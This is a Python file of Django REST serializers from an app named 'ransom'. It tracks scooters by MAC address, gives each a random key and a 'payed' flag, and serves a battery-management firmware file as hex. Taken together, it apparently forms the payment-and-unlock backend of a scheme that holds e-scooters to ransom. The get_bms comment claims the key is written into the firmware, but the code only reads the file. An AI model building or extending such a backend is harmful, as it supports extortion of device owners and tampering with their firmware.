from rest_framework import serializers
from secrets import token_bytes

from ransom.models import Scooter


class ScooterSerializer(serializers.Serializer):
    """Serializzatore generico per Scooter"""
    mac = serializers.CharField(max_length=17)
    key = serializers.CharField(max_length=16)
    payed = serializers.BooleanField()

    def to_representation(self, instance):
        return {
            'mac': instance.mac,
            'key': instance.key,
            'payed': instance.payed
        }


class ScooterCreateSerializer(serializers.Serializer):
    """Serializzatore per creazione scooter"""
    mac = serializers.CharField(max_length=17)

    def create(self, validated_data):
        mac_value = validated_data['mac']
        key_value = token_bytes(8).hex()
        
        scooter = Scooter(mac=mac_value, key=key_value, payed=False)
        scooter.save()
        return scooter


class ScooterUpdateSerializer(serializers.Serializer):
    """Serializzatore per aggiornamento scooter"""
    payed = serializers.BooleanField(required=False)

    def update(self, instance, validated_data):
        instance.payed = validated_data.get('payed', instance.payed)
        instance.save()
        return instance


class ScooterGetKeySerializer(serializers.Serializer):
    """Serializzatore per ottenere la chiave"""
    key = serializers.CharField(read_only=True)

    def to_representation(self, instance):
        return {'key': instance.key}


class ScooterGetBMSSerializer(serializers.Serializer):
    """Serializzatore per ottenere i dati BMS"""
    bms = serializers.SerializerMethodField()

    def get_bms(self, obj):
        # Modifica il file bin aggiungendo la chiave
        try:
            with open("126.bin", 'rb') as file:
                file_data = file.read()
            hex_data = file_data.hex()
            return hex_data
        except FileNotFoundError:
            return None


